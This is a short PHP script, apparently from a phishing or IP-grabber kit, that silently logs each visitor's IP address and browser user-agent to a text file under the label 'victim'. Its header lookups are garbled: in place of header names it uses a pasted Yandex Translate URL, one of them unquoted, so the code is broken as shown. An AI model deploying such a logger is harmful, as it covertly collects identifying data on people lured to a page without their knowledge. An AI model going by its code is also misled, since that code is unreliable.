<?php

if (!empty($_SERVER['https://translate.yandex.ru/?ysclid=m45udrw7bv838269006&source_lang=ru&target_lang=en&text=%D0%9D%D1%83%20%D0%BA%D0%B0%D0%BA%20%D0%BF%D0%BE%D0%BB%D1%83%D1%87%D0%B8%D0%BB%D0%BE%D1%81%D1%8C%3F']))
    {
      $ipaddress = $_SERVER[https://translate.yandex.ru/?ysclid=m45udrw7bv838269006&source_lang=ru&target_lang=en&text=%D0%9D%D1%83%20%D0%BA%D0%B0%D0%BA%20%D0%BF%D0%BE%D0%BB%D1%83%D1%87%D0%B8%D0%BB%D0%BE%D1%81%D1%8C%3F]."\r\n";
    }
elseif (!empty($_SERVER['https://translate.yandex.ru/?ysclid=m45udrw7bv838269006&source_lang=ru&target_lang=en&text=%D0%9D%D1%83%20%D0%BA%D0%B0%D0%BA%20%D0%BF%D0%BE%D0%BB%D1%83%D1%87%D0%B8%D0%BB%D0%BE%D1%81%D1%8C%3F']))
    {
      $ipaddress = $_SERVER['https://translate.yandex.ru/?ysclid=m45udrw7bv838269006&source_lang=ru&target_lang=en&text=%D0%9D%D1%83%20%D0%BA%D0%B0%D0%BA%20%D0%BF%D0%BE%D0%BB%D1%83%D1%87%D0%B8%D0%BB%D0%BE%D1%81%D1%8C%3F']."\r\n";
    }
else
    {
      $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
    }
$useragent = " User-Agent: ";
$browser = $_SERVER['HTTP_USER_AGENT'];


$file = 'ip.txt';
$victim = "IP: ";
$fp = fopen($file, 'a');

fwrite($fp, $victim);
fwrite($fp, $ipaddress);
fwrite($fp, $useragent);
fwrite($fp, $browser);


fclose($fp);
